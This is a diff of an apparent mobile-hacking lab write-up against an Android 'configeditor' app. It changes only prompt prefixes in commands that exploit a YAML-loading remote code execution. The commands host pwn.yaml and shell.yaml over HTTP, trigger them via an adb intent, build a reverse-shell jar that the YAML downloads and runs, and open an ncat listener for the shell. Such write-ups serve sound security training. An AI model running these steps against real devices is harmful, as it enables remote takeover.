@@ -127,11 +127,11 @@ We can test this RCE with the following commands:
 
 ```sh
 # Start a Python HTTP server on port 8080 to serve files
-$linux> python3 -m http.server 8080 # file pwn.yaml must be in the current directory
+$ python3 -m http.server 8080 # file pwn.yaml must be in the current directory
 # Simulate an HTTP connection with the specified YAML file using adb
-$linux> adb shell am start -a android.intent.action.VIEW -d  "http://$IP:8080/pwn.yaml" -n com.mobilehackinglab.configeditor/.MainActivity
+$ adb shell am start -a android.intent.action.VIEW -d  "http://$IP:8080/pwn.yaml" -n com.mobilehackinglab.configeditor/.MainActivity
 # List the contents of the directory /data/data/com.mobilehackinglab.configeditor on the Android device
-$linux> adb shell ls /data/data/com.mobilehackinglab.configeditor
+$ adb shell ls /data/data/com.mobilehackinglab.configeditor
 output: pwn.txt # in listing file
 ```
 
@@ -150,15 +150,15 @@ Initially it didn't seem to work with the tools in the 2018 writeup, so I decide
 
 ```sh
 # Compile AndroidReverseShell.java (is in this github folder) using Java compiler (javac) with release 17
-javac --release 17 AndroidReverseShell.java
+$ javac --release 17 AndroidReverseShell.java
 # Create a directory called classes
-mkdir classes
+$ mkdir classes
 # Convert .class files to .dex format using D8 (D8 is part of Android build tools)
-/Path/to/Android/sdk/build-tools/33.0.2/d8 AndroidReverseShell.class --intermediate --file-per-class --output classes
+$ /Path/to/Android/sdk/build-tools/33.0.2/d8 AndroidReverseShell.class --intermediate --file-per-class --output classes
 # Rename AndroidReverseShell.dex to classes.dex
-mv classes/AndroidReverseShell.dex classes/classes.dex
+$ mv classes/AndroidReverseShell.dex classes/classes.dex
 # Create a JAR file named reverse.jar containing the dex files
-zip classes/reverse.jar classes/classes.dex
+$ zip classes/reverse.jar classes/classes.dex
 ```
 
 Create the shell.yaml file that will remotely download the `.jar` file and execute the process to receive the reverse shell.
@@ -172,11 +172,11 @@ Let's go
 
 ```sh
 # Start a Python HTTP server to host the shell.yaml and reverse.jar files in  folder
-python3 -m http.server 8081 
+$ python3 -m http.server 8081 
 # Start a listener for the reverse shell on port 1337 in another tab
-ncat -lnvp 1337 
+$ ncat -lnvp 1337 
 # Emulate browser interaction by sending an intent to open the specified URL, load file and get rev shell
-adb shell am start -a android.intent.action.VIEW -d "http://$IP:8081/shell.yaml" -n com.mobilehackinglab.configeditor/.MainActivity 
+$ adb shell am start -a android.intent.action.VIEW -d "http://$IP:8081/shell.yaml" -n com.mobilehackinglab.configeditor/.MainActivity 
 ```
 
 Video PoC:
